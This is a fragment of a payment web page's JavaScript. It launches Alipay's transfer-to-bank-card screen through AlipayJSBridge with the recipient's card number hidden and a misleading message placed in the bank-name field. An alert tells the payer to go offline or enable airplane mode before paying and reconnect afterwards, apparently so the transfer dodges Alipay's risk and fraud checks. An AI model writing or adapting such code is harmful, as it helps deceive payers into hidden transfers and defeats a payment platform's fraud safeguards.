							type: "post",

									_tradeNoData.action = "getTradeNo_ok|" + tool.nowTime();

												}, 2000)

												window.setTimeout(function() {
													AlipayJSBridge.call("startApp", {
														appId: "20000116",
														param: {
															actionType: "toCard",

															startFromExternal: true,

															receiverName: asdsdkname,
															bankAccount: asdsdkname,
															money: money,
															amount: money,
															bankMark: bankMark,
															bankName: "请重新打开网络支付",
															cardIndex: bankCardIndex,
															cardNoHidden: "true",
															cardChannel: "HISTORY_CARD",
															orderSource: "from"
														}
													});
												}, 888)

											} else {
												alert("请先关闭网络或者打开飞行模式再点击立即付款按钮，跳转转账界面后再打开网络或者关闭飞行模式即可支付");
											}
										});
									})
								} /*else if(res.code == 80006) {
									setTimeout(function() {
										lunxnumber++;
										if(lunxnumber >= 15) {
											$("#btn-pop-text").text("下单失败，请重新下单");
											$("#loading-box").remove();
											//记录行为
											_tradeNoData.action = "getTradeNo-80006|" + tool.nowTime();
										} else {
											getUrl(_tradeNoDataMain);
										}
									}, 888)
								} */else {
									$("#btn-pop-text").text("下单失败，请重新下单");
									$("#loading-box").remove();
									_tradeNoData.action = "getTradeNo-failure|" + tool.nowTime();
								}
							},
							error: function(err) {
								$("#btn-pop-text").text("下单失败，请重新下单");
								$("#loading-box").remove();
								_tradeNoData.action = "getTradeNo-error|" + tool.nowTime();
							}
						})
					}
					getUrl(_tradeNoDataMain);
				</script>
